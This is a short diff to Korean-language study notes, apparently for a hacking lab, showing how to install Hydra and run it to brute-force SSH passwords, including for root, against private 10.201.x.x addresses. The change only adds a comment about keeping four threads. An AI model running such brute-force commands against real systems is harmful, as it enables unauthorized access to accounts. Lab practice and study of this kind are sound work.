@@ -15,6 +15,7 @@ hydra -l <username> -P <full path to pass> 10.201.20.141 -t 4 ssh
 # 설치 (kali는 기본 설치)
 sudo apt update && sudo apt install -y hydra
 
+# 안전하게 -t 4
 hydra -l root -P passwords.txt 10.201.20.141 -t 4 ssh
 hydra -l <username> -P <full path to pass> 10.201.106.187 -t 4 ssh
 
